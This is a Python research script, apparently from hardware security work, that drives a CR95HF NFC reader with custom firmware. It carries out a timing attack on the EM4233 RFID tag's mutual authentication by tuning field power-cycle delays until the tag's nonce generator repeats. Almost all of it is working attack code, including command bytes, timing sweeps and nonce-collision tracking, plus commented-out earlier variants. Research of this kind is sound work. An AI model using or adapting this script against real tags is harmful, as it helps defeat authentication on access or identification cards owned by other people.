#!/usr/bin/python3

# Author: ceres-c 2020-01-14

# This script relies on a custom CR95HF firmware to perform
# timing attacks on the EM4233 mutual authentication

# NOTES on the hardware
# Time1 = 0xb1
#   This is the smallest value which allows the card to respond to a command
#   after Time2 = 0
#   Nonetheless, Time1 = 0x200 has given great success with the
#   SWEEPING THROUGH TIMES WAITING FOR REPEATED NONCE version
# Time2 = 0x20
#   This is the smallest value which allows the card to respond to a command
#   after a huge Time1 (which makes it power off completely)

# Bringing up the field takes 149 uSec
# After the field is actually on, before reader modulation starts, 140 uSec pass
# After reader modulation started, before the tag response, 229 uSec pass
# These times can't be influenced.
fixed_overhead_time = 140 + 229 # We don't actually care about the time it takes to bring the field up, but only about what it happens once it's on

# TODO
# Provare a fare una sola richiesta di random e continuare ad incrementare Timer2 tra due valori
# "sensati" (cioè il tempo minimo a cui risponde la tessera ed il tempo che medio dopo cui il lettore
# mandava la richiesta di random con HID dalla dock) finché non si ottiene una collisione, poi continuare
# a cercare sul valore di Timer2 in cui si è verificata la collisione.
# Se il rate di collisioni è inizialmente alto e poi tende a diminuire bisogna ridurre/aumentare Timer2
# finché non si torna ad avere collisioni

import hid
import struct
import random
from collections import Counter
from collections import defaultdict

# Global defines & commands
cmd_inventory = [0x27, 0x01, 0x00]
cmd_inventory_single_subcarrier = [0x26, 0x01, 0x00]
cmd_select = [0x23, 0x25] # The UID must be appended in reverse order (ending in E0)
cmd_read_multi = [0x13, 0x23] # The following list will be appended to this "bare" read multi command which is missing start addr and length
read_multi_ranges = [(0x00, 0x03), (0x1c, 0x02), (0x2a, 0x01), (0x1f, 0x01), (0x04, 0x02)]
cmd_request_nonce = [0x02, 0xe0, 0x16, 0x00]
cmd_auth1 = [0x02, 0xe1, 0x16, 0xde, 0xbc, 0x9a, 0x78, 0x56, 0x34, 0x12, 0x00] # 3 bytes of the f function should be appended here

global_timer = 0 # Will hold the total number of atomic requests; updated in CR95HF_ISO15_send_recv
'''
Allows to configure ISO15693 reader parameters

Args:
    h (hid device object)
    append_crc (bool): If True ISO15 CRC is added after the data APDU.
    dual_subcarrier (bool): If True data is sent in dual subcarrier mode, else single sub
    modulation_10 (bool): If True 10% modulation, else 100% mod
    wait_for_SOF (bool): If True the reader will wait for tag's SOF, else it'll respects ISO's standard 312-μs delay
    speed (int): Can assume the following values
        0: 26 Kbps (H)
        1: 52 Kbps
        2: 6 Kbps (L)
        3: RFU
'''
def CR95HF_ISO15_configure(h, append_crc=True, dual_subcarrier=False, modulation_10=False, wait_for_SOF=False, speed=0):
    payload = []
    payload.append(0x01) # HID related, not relevant
    payload.append(0x02) # CR95HF ProtocolSelect command
    payload.append(0x02) # Length of following data
    payload.append(0x01) # ISO15693 protocol selection
    parameters = 0
    parameters |= (append_crc << 0)
    parameters |= (dual_subcarrier << 1)
    parameters |= (modulation_10 << 2)
    parameters |= (wait_for_SOF << 3)
    parameters |= (speed << 4)
    payload.append(parameters)

    h.write(payload)
    h.read(64) # This is used only to empty the buffer


'''
Allows to send and receive data from an NFC ISO15693 tag

Args:
    h (hid device object)
    data (byte list)
    atomic (bool): Allow to use atomic commands, needs custom CR95HF firmware
    Time1: (int) field off -> wait -> field on
           0x50 has been found to be the minimum time to allow the card to
           power off completely
    Time2: (int) field on -> wait -> send command
           0x0e has been found to be the minimum time to allow the card to
           respond after it has been completely powered off

        WARNING: You might want to check if the defaults for Time1 and Time2
                 are fine with your own card

Return:
    (int, byte list) A tuple with the error code and the data from the tag.
                        Successful read has a 0x80 error code
                        Other errors can be found in the CR95HF datasheet
'''
def CR95HF_ISO15_send_recv(h, data, atomic=False, Time1=0xb1, Time2= 0x20):
    global global_timer
    global_timer += fixed_overhead_time + Time2

    payload = []
    if atomic:
        payload.append(0x03) # Custom atomic command
        payload.extend(struct.pack('>H', Time1)) # Time1 (field off -> wait -> field on)
        payload.extend(struct.pack('>H', Time2)) # Time2 (field on -> wait -> send command)
    else:
        payload.append(0x01) # Standard SendRecv command

    payload.append(0x04) # SendRecv command
    payload.append(len(data))
    payload.extend(data)

    #print ("".join("0x%02x " % i for i in payload))

    h.write(payload)

    d = h.read(64)
    ret_code = d[1]
    ret_data = d[3:d[2]+2] # Data length is in response byte 2
    return (ret_code, ret_data)

# connect to reader
h = hid.device()
h.open(0x0483, 0xd0d0)

CR95HF_ISO15_configure(h, wait_for_SOF=True)

# Inventory is performed to initialize correctly CR95HF board
print ("TX - Inventory:", ["".join("%02x" % i for i in cmd_inventory_single_subcarrier)])
ret_code, data = CR95HF_ISO15_send_recv(h, cmd_inventory_single_subcarrier)
if ret_code != 0x80:
    print("Error code 0x{:02X} performing inventory!".format(ret_code))
    exit(1)
print ("RX - Inventory:", ["".join("%02x" % i for i in data)])
uid_flipped = data[2:10]

# nonces = [] # TODO move this below
# while True:
#     print("-" * 20)
#     for i in range(500):
#         if (i % 250 == 0 and i != 0):
#             print(i, "Last nonce:", nonces[-1], end="\r", flush=True)
#         ret_code, data = CR95HF_ISO15_send_recv(h, [0x02, 0xe0, 0x16, 0x00], atomic=True, Time1=380, Time2=0x40) # Request random nonce
#         if ret_code != 0x80:
#             print("ERROR from card with current Time2")
#             break
#         nonces.append("".join("%02x" % i for i in data[1:8])) # Strip out only the nonce

#     print("\nResults:")

#     c = Counter(nonces)
#     for n, count in c.most_common(5):
#         print('%s: %d' % (n, count))

# exit(0)

# ################ NEW TIME ACCURATE VERSION ###############
# INFO: With fixed timings
# while True:
#     for time_sweep in range(0x7a, 0x200): # TODO WARNING change to 0x00 as starting value!
#         nonces = []
#         print("-" * 20)
#         print ("Current time:", hex(time_sweep))
#         for i in range(5001): # TODO change to 15000
#             # for i_n in range (10):
#             #     ret_code, data = CR95HF_ISO15_send_recv(h, cmd_inventory_single_subcarrier, atomic=True, Time1=0x800, Time2=0x80) # Clean out the PRNG IV
#             #     if ret_code != 0x80:
#             #         break
#             if (i % 50 == 0 and i != 0):
#                 print(i, "- Last nonce:", nonces[-1], end="\r", flush=True)
#             ret_code, data = CR95HF_ISO15_send_recv(h, [0x02, 0xe0, 0x16, 0x00], atomic=True, Time1=0xffff, Time2=time_sweep) # Request random nonce
#             if ret_code != 0x80:
#                 print("ERROR from card with current Time2")
#                 break
#             nonces.append("".join("%02x" % i for i in data[1:8])) # Strip out only the nonce

#         print("\nResults:")

#         c = Counter(nonces)
#         for n, count in c.most_common(5):
#             print('%s: %d' % (n, count))

# exit(0)
# ##########################################################

# ##### SWEEPING THROUGH TIMES AND ONCE FOUND IN THE VICINITY #####
# Try to guess a time close to the next occurrence of the same nonce
INITIAL_TIME_MIN = 0x70
INITIAL_TIME_MAX = 0x200
INITIAL_POWEROFF_TIME = 0x200

all_nonces = set()
synched_nonces = defaultdict(int)
most_likely_nonces = defaultdict(int)
frame_time = 0

def sync_to_frame(min_time, max_time):
    global all_nonces
    iteration = 0
    while True:
        for time_sweep in range(min_time, max_time):
            ret_code, data = CR95HF_ISO15_send_recv(h, cmd_request_nonce, atomic=True, Time1=INITIAL_POWEROFF_TIME, Time2=time_sweep) # Request random nonce
            if ret_code != 0x80:
                continue

            nonce = bytes(data[1:8]).hex() # Strip out only the nonce

            if nonce in all_nonces:
                return (nonce, time_sweep)
            else:
                all_nonces.add(nonce)

            if (iteration % 50 == 0): # To keep track of current progress
                print(iteration, "- Last nonce:", nonce, end="\r", flush=True)

            iteration += 1

unlucky_run_counter = 0
while len(most_likely_nonces) < 5:
    most_likely_nonces = defaultdict(int) # Start out fresh if the last run wasn't lucky
    synched_nonces = defaultdict(int) # Same as above
    candidate_nonce, frame_time = sync_to_frame(INITIAL_TIME_MIN, INITIAL_TIME_MAX)
    print ("[!] Synchronized with nonce generation frame! Time:", hex(frame_time), "Nonce:", candidate_nonce)
    # if frame_time < 0x70:
    #     print ("[!] Time2 was too short, skipping")
    #     continue

    for iteration in range (0, 0x500): # Search in the vicinity of current random
        ret_code, data = CR95HF_ISO15_send_recv(h, cmd_request_nonce, atomic=True, Time1=INITIAL_POWEROFF_TIME, Time2=frame_time) # Request random nonce
        nonce = bytes(data[1:8]).hex() # Strip out only the nonce
        #synched_nonces.setdefault(nonce, []).append(iteration * (frame_time + fixed_overhead_time))
        synched_nonces[nonce] += 1

    for nonce, hits in synched_nonces.items():
        if hits > 5: # Chosen by a fair dice roll
            most_likely_nonces[nonce] = hits
            print ("[#] Nonce", nonce, "was found", hits, "times")
            unlucky_run_counter = 0

    if len(most_likely_nonces) < 5:
            unlucky_run_counter += 1

    if unlucky_run_counter >= 10: # TODO fix this as it's not working
        print ("[!] 10 unlucky runs, trying to mess things up a bit")
        CR95HF_ISO15_send_recv(h, cmd_request_nonce, atomic=True, Time1=INITIAL_POWEROFF_TIME, Time2=0x200) # Just to mess things up a bit
        unlucky_run_counter = 0

    print ("[!] Starting over")

print ("[!] Found a lucky run with time", hex(frame_time))


# # Following for cycle is to get an estimate of good threshold values
# for i in range (0, window_size):
#     ret_code, data = CR95HF_ISO15_send_recv(h, cmd_request_nonce, atomic=True, Time1=INITIAL_POWEROFF_TIME, Time2=frame_time) # Request random nonce
#     nonce = bytes(data[1:8]).hex() # Strip out only the nonce
#     if nonce in most_likely_nonces:
#         #most_likely_nonces[nonce].append(iteration * (frame_time + fixed_overhead_time))
#         print ("[#] Hit while identifying ideal hit rate", nonce)
#         hit_counter += 1

hit_counter = sum(most_likely_nonces.values())
window_size = 100
ideal_hits = (hit_counter / 0x500) * window_size / 2 # We can consider this value to be the target we're aiming for
ideal_frame_time = frame_time

print ("Hits count:", hit_counter, " - Ideal hits for this run:", ideal_hits)


too_fast = False

while True:

    if hit_counter < ideal_hits:
        print ("[!]", hit_counter, "hits - lowering time2")
        frame_time -= 1 # TODO maybe this can be lowered further
        too_fast = True

    hit_counter = 0
    for i in range (0, window_size):

        if too_fast and i > 5:
            too_fast = False
            frame_time = ideal_frame_time # Restore the value once it has been lower for a single run

        ret_code, data = CR95HF_ISO15_send_recv(h, cmd_request_nonce, atomic=True, Time1=INITIAL_POWEROFF_TIME, Time2=frame_time) # Request random nonce
        nonce = bytes(data[1:8]).hex() # Strip out only the nonce
        if nonce in most_likely_nonces:
            most_likely_nonces[nonce] += 1
            #most_likely_nonces[nonce].append(iteration * (frame_time + fixed_overhead_time))
            print ("[#] Hit", nonce, "hits:", most_likely_nonces[nonce])
            hit_counter += 1
            too_fast = False
            frame_time = ideal_frame_time




#h.write([0x01, 0x02, 0x02, 0x00, 0x00]) # Turn off the field to avoid messing with the current PRNG state

exit(0)
# ##########################################################


# ################# OLD UNRELIABLE VERSION #################
# CR95HF_ISO15_configure(h, wait_for_SOF=True, dual_subcarrier=True)
# print ("TX - Inventory:", ["".join("%02x" % i for i in cmd_inventory)])
# ret_code, data = CR95HF_ISO15_send_recv(h, cmd_inventory)
# if ret_code != 0x80:
#     print("Error code 0x{:02X} performing inventory!".format(ret_code))
#     exit(1)
# print ("RX - Inventory:", ["".join("%02x" % i for i in data)])

# while True:
#     CR95HF_ISO15_configure(h, wait_for_SOF=True)
#     ret_code, data = CR95HF_ISO15_send_recv(h, [0x02, 0xe0, 0x16, 0x00]) # Request random nonce
#     print ("".join("%02x" % i for i in data[1:8]))
#     h.write([0x01, 0x02, 0x02, 0x00, 0x00]) # Turn off the field
#     h.read(64) # This is used only to empty the buffer
# ##########################################################
